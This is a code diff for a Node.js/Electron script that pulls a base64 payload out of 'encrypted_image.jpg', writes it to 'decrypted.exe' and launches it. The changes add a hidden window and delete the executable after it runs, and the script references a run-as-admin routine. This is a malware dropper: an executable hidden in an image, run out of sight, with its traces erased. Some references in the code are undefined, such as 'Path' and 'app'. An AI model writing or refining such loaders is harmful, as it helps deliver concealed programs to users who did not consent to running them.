@@ -1,9 +1,17 @@
 const fs = require('fs');
 const path = require('path');
 const { exec } = require('child_process');
-const os = require('os');
+const process = require('process');
 
-const imageFile = 'encrypted_image.jpg';
+path.dirname(require('electron').remote.app.getPath("exe"))
+
+let rootDir = app.getAppPath()
+let last = path.basename(rootDir)
+if (last == 'app.asar') {
+    rootDir = Path.dirname(app.getPath('exe'))
+}
+
+const imageFile = path.join(rootDir, 'encrypted_image.jpg');
 const outputFile = 'decrypted.exe';
 
 function runAsAdmin() {
@@ -42,13 +50,15 @@ const decodedData = Buffer.from(base64EncodedData, 'base64');
 fs.writeFileSync(outputFile, decodedData);
 console.log(`The decrypted exe file ${outputFile} has been created.`);
 
-exec(`cmd.exe /c "start ${outputFile}"`, (err, stdout, stderr) => {
-    if (err) {
-        console.error(err);
+exec(`start cmd /c "${outputFile}"`, { windowsHide: true }, (error, stdout, stderr) => {
+    if (error) {
+        console.error(`exec error: ${error}`);
         return;
     }
-    console.log(stdout);
+    fs.unlink(outputFile, (err) => {
+        if (err) throw err;
+        console.log(`${outputFile} has been deleted`);
+    });
 });
 
-//delete decrypted exe
-fs.unlinkSync(outputFile);
+//process.exit();
